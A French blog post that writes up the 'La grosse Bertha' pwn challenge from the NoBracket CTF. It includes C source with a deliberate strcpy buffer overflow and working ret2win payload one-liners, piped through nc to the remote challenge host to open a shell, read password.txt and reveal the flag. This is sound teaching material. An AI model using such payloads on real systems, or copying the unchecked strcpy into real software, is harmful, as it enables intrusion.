---
layout: post
title: La grosse Bertha
subtitle: Write-Up pour le NBCTF
tags: [writeup, pwn, nbctf]
comments: true
---
Bonjour ! Voici mon write-up sur le challenge **La grosse Bertha** à l'occasion du NoBracket CTF. Il s'agit de mon troisième write-up, alors n'hésitez pas à aller voir les autres après avoir lu celui-là !
Je ne suis d'ordinaire pas très fan de pwn, mais j'ai apprécié faire ce challenge, qui m'a remis les basiques de l'exploitation de binaire en tête. Merci donc à `MaitreChiffon` pour cela. Mais sur ce, passons au write-up !

## Premier coup d'oeil
![Challenge](https://cdn.discordapp.com/attachments/822188888297963560/1175380527801454694/Capture_decran_34.png?ex=656b056b&is=6558906b&hm=7d97a060ac7f251fb39adc2b4cdca9cbd8389c70ad9209ee41ca16cd92c5bbb0&){: .mx-auto.d-block :}

Ce challenge dispose de deux fichiers, un binaire ainsi que le code source, écrit en C, de ce binaire. Enfin, une adresse en remote est fournie avec ce challenge, pour pouvoir réaliser le challenge à distance et ainsi avoir le flag. Mais regardons le code source fourni avant de nous atteler à l'exploitation.

## Identification de la vulnérabilité
Nous nous retrouvons donc avec un fichier `TheBigBertha.c`, dont voici le code source :
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>


void shell(){

    setreuid(geteuid(),geteuid());
    system("/bin/bash");
}


void foo(char *msg){

    char buf[64];
    puts("Delta Charlie. Ordre bien reçu.");
    strcpy(buf,msg);
    printf("La cible est : %s\n", buf);
}

void init() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

int main(int argc, char **argv)
{
    init();
    puts("Entrez la cible :");
    char input[512];
    fgets(input, 511, stdin);
    if(strlen(input) > 1)
    {
        foo(input);
    }
    else{
 	puts("Veuillez entrer une chaine de caractères.");
    }

    printf("Programme is exiting normally ! \n");
    return 0;
}
```

Nous avons 4 fonctions, intitulées `shell`, `foo`, `init` et `main`. La fonction `init` ne nous intéressera pas ici. Mais nous remarquons quelque chose. Une fonction n'est jamais appelée dans le programme, et il s'agit de la fonction `shell`, qui nous permet de faire spawn un shell ! Et donc sûrement de récupérer le flag ! Nous sommes donc sur ce qu'on appelle un ret2win, c'est-à-dire que nous allons chercher à exploiter ce programme pour appeler cette fonction. Mais regardons où se situe cette vulnérabilité.
Nous pourrions tout d'abord penser qu'elle se situe dans `main`, mais aucune fonction non-sécurisée n'est appelée. En effet, ici, `fgets` est la version sûre du traditionnel `gets`. Rien à faire donc ici, puisque `fgets` récupère uniquement 511 caractères de `stdin`. 

{: .box-note}
**Note:** Et pourquoi pas 512 caractères ? Tout simplement parce que le dernier caractère est réservé au caractère nul (le fameux `\0` !)

Par la suite, la variable `input` sera passée en argument à la fonction `foo`. Nous regardons donc cette fonction, toujours à la recherche d'une vulnérabilité. Et puis là, nous voyons le problème immédiatement.

![strcpy](https://cdn.discordapp.com/attachments/822188888297963560/1175385452811931648/86h1e0.jpg?ex=656b0a01&is=65589501&hm=6cd10817881fa0e1af5e06454f1dff5a885b08fa9e422cdd209bb6f0390ecca6&){: .mx-auto.d-block :}

Et oui ! Le `strcpy` ici permet un buffer overflow. Mais comment cela se fait-il ? Eh bien, tout simplement, une variable `input` peut faire au maximum 512 caractères, et nous avons un `strcpy` dans la variable `buf`... Qui fait au maximum 64 caractères. Donc là, c'est l'overflow.
Nous pouvons vérifier ça assez simplement.
```console
blackraven@blackraven:~$ python3 -c "print('A'*64)" | ./TheBigBertha
Entrez la cible :
Delta Charlie. Ordre bien reçu.
La cible est : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Programme is exiting normally !
```
Ici, tout marche. Mais si nous mettons une taille de 100...
```console
blackraven@blackraven:~$ python3 -c "print('A'*100)" | ./TheBigBertha
Entrez la cible :
Delta Charlie. Ordre bien reçu.
La cible est : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Segmentation fault
```
Nous avons l'erreur de segmentation ! What's next ? Passons à l'exploitation !

## Exploitation

Avant toute chose, nous devons regarder l'adresse de la fonction `shell`, afin de pouvoir écraser l'adresse de retour avec l'adresse de `shell`.
Un petit tour sur `gdb` (avec bien sûr `pwndbg` et pas `peda`) nous renseigne assez vite sur l'adresse de la fonction `shell`, dont la première instruction se situe à l'adresse `0x080491f6`.

{: .box-note}
**Note:** Il ne faudra pas oublier de mettre notre adresse en little endian ! Ce qui donnera `\xf6\x91\x04\x08` !

On continue notre roadtrip sur `gdb` pour voir le padding nécessaire pour écraser le registre `EIP` avec la valeur de retour de notre adresse. Un outil très pratique, nommé `cyclic`, va nous permettre de faire cela.
![gdb](https://cdn.discordapp.com/attachments/822188888297963560/1175418096203341855/Capture_decran_35.png?ex=656b2868&is=6558b368&hm=e5eb5a6ad597aabf5c434c57efbcb28d1f1c768443daad8286283ef594e333e1&){: .mx-auto.d-block :}

Comme vous pouvez le voir, cyclic indique ici un offset de 76. On teste donc avec cette offset en utilisant python2, et non pas python3 (ce dernier a tendance à faire n'importe quoi, ce qui fait que votre payload, même si il est juste, ne marchera pas).
```console
blackraven@blackraven:~$ python2 -c 'print "A"*76+ "\xf6\x91\x04\x08" ' | ./TheBigBertha
Entrez la cible :                                                                                                                                                                                               Delta Charlie. Ordre bien reçu.                                                                                                                                                                                 La cible est : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA                                                                                                                                                                                                                                                                                                                                     Segmentation fault
```
Et... il ne se passe rien. Est-ce qu'on a fait quelque chose de mal ? Non, ça ne se voit peut-être pas, mais notre payload marche. Un shell spawn, mais se referme immédiatement ! Il faut donc rajouter une commande, comme `cat`, permettant de garder le shell en vie.
On recommence donc :
```console
blackraven@blackraven:~$ (python2 -c 'print "A"*76+ "\xf6\x91\x04\x08" '; cat) | ./TheBigBertha
Entrez la cible :                                                                                                                                                                                               Delta Charlie. Ordre bien reçu.                                                                                                                                                                                 La cible est : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA                                                                                                                                                                                                                                                                                                                                     ls                                                                                                                                                                                                              TheBigBertha  TheBigBertha.c
```
Et ça marche ! Notre payload est fonctionnel en local, donc plus qu'à flagger en remote !
![meme](https://cdn.discordapp.com/attachments/822188888297963560/1175421284990066738/86h9ua.jpg?ex=656b2b60&is=6558b660&hm=5b128794bcb338703cd29fecddb422aa9dc73366ab70f1919606146ea6ab1442&){: .mx-auto.d-block :}

## Plus qu'à flag en remote !
Il ne nous reste plus grand chose à faire maintenant. On se connecte donc en remote à `thebigbertha.nobrackets.fr` sur le port `30343`.
```console
blackraven@blackraven:~$ (python2 -c 'print "A"*76+ "\xf6\x91\x04\x08" '; cat) | nc thebigbertha.nobrackets.fr 30343
Entrez la cible :                                                                                                                                                                                               Delta Charlie. Ordre bien reçu.                                                                                                                                                                                 La cible est : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA                                                                                                                                                                                                                                                                                                                                     ls                                                                                                                                                                                                              password.txt                                                                                                                                                                                                    pwn                                                                                                                                                                                                             cat password.txt                                                                                                                                                                                                NBCTF{4_M0r3_D1FF1CU17_0V3rF10W_66}                                                                                                                                                                             exit
```

On a notre flag : `NBCTF{4_M0r3_D1FF1CU17_0V3rF10W_66}` !
Comme quoi, ça a du bon de crier "AAAAAA" sur La Grosse Bertha.

![meme2](https://cdn.discordapp.com/attachments/811715744835567616/999765823356948520/hacker.png?ex=6568e7fb&is=655672fb&hm=8dc2cd9f820ac46f47c3965e792aa67804bb8d9e64eb2f523bb27e536c921c69&){: .mx-auto.d-block :}


## Conclusion

J'ai bien aimé ce challenge, que j'ai trouvé très sympa à faire étant donné que cela rappelle les basiques et la méthodo de l'exploitation de binaire. Un petit ret2win fort sympathique, qui ne présage que du bon pour les challenges de la finale !
